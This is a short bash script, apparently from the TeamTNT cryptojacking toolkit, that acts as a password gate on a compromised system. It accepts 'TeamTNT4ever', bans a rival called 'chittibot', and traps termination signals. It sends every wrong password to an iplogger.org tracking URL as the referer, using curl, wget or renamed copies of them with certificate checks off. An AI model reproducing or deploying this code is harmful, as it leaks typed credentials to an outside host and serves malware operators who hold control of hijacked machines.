#!/bin/bash
trap echo "Not way Dude!!!" SIGINT SIGTERM SIGHUP

PASSWORD_WRONG=1


function LOGGINGYOU(){
FALSEPWD=$1 
LOGURL="https://iplogger.org/1sRfr7"

if type busybox 2>/dev/null 1>/dev/null
then 
curl -kLs -o /dev/null $LOGURL --user-agent ChittiFuck --referer $FALSEPWD || cur -kLs -o /dev/null $LOGURL --user-agent ChittiFuck --referer $FALSEPWD || cdl -kLs -o /dev/null $LOGURL --user-agent ChittiFuck --referer $FALSEPWD || wget -q --no-check-certificate -O /dev/null --user-agent ChittiFuck --referer $FALSEPWD $LOGURL || wge -q --no-check-certificate -O /dev/null --user-agent ChittiFuck --referer $FALSEPWD $LOGURL || wdl -q --no-check-certificate -O /dev/null --user-agent ChittiFuck --referer $FALSEPWD $LOGURL
else
curl -kLs -o /dev/null $LOGURL --user-agent ChittiFuck --referer $FALSEPWD || cur -kLs -o /dev/null $LOGURL --user-agent ChittiFuck --referer $FALSEPWD || cdl -kLs -o /dev/null $LOGURL --user-agent ChittiFuck --referer $FALSEPWD || wget -q --no-check-certificate -O /dev/null --user-agent=ChittiFuck --referer=$FALSEPWD $LOGURL || wge -q --no-check-certificate -O /dev/null --user-agent=ChittiFuck --referer=$FALSEPWD $LOGURL || wdl -q --no-check-certificate -O /dev/null --user-agent=ChittiFuck --referer=$FALSEPWD $LOGURL
fi
}


function ANTICHITTIBOT(){
clear 
echo ''
echo 'chittibot@72 you are'
echo '     BANNED         '
echo 'from this Network!!!'
echo ''
LOGGINGYOU "chittibot has try"
sleep 3000000000
ASKAPASS
}

function ASKAPASS(){
clear 
while [ $PASSWORD_WRONG -eq 1 ]
 do
    echo "Enter your password:"
    read -s ENTERED_PASSWORD
if [ "$ENTERED_PASSWORD" == "chittibot@72" ]; then 
ANTICHITTIBOT
elif [ "$ENTERED_PASSWORD" == "TeamTNT4ever" ]; then 
echo "Access Granted"
PASSWORD_WRONG=0
else
LOGGINGYOU "$ENTERED_PASSWORD"
echo "Access Deniend: Incorrenct password!. Try again"
fi
done
}
ASKAPASS

